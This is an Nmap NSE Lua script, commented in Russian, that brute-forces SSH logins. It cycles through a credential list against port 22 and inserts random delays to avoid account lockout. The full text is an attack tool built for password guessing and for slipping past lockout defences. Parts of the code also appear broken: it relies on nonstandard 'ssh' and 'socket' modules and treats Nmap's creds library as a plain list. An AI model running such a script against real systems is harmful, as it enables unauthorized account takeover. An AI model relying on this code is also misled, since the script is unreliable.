-- ssh_bruteforce.nse
--
-- Перебор SSH учетных данных с учетом защиты от блокировок и задержек.
--
-- Требования:
--   nmap 7.80+, lua-ssh библиотека (если есть)
--
-- Автор: TeslaAI Expert
-- Лицензия: Same as Nmap

local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local ssh = require "ssh" -- Внешняя или встроенная lua SSH библиотека
local creds = require "creds" -- Список логинов/паролей
local socket = require "socket"

description = [[
Перебор SSH учетных данных для обнаружения слабых паролей и учетных записей.
]]

author = "TeslaAI Expert"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"brute", "intrusive"}

portrule = shortport.port_or_service(22, "ssh")

local function try_ssh_login(host, port, user, pass)
  local status, err = false, nil
  local session, err = ssh.new()
  if not session then
    return false, "SSH session creation failed: " .. tostring(err)
  end

  session:set_timeout(7000)

  local ok, err = session:connect(host, port)
  if not ok then
    return false, "Connection failed: " .. tostring(err)
  end

  local ok, err = session:authenticate_password(user, pass)
  session:disconnect()

  if ok then
    return true, nil
  else
    return false, err
  end
end

action = function(host, port)
  local results = {}

  for _, cred in ipairs(creds) do
    local user = cred.username
    local pass = cred.password

    stdnse.print_debug(1, "Пробуем SSH %s:%s с %s/%s", host.ip, port.number, user, pass)

    local ok, err = try_ssh_login(host.ip, port.number, user, pass)

    if ok then
      table.insert(results, string.format("Успешный вход SSH: %s / %s", user, pass))
      break
    elseif err then
      stdnse.print_debug(2, "Ошибка при попытке входа SSH: %s", err)
    end

    -- Защита от блокировок — задержка 500–1500 мс
    socket.sleep(math.random(500, 1500) / 1000)
  end

  if #results == 0 then
    return "Перебор SSH не выявил уязвимых учётных данных."
  end

  return table.concat(results, "\n")
end
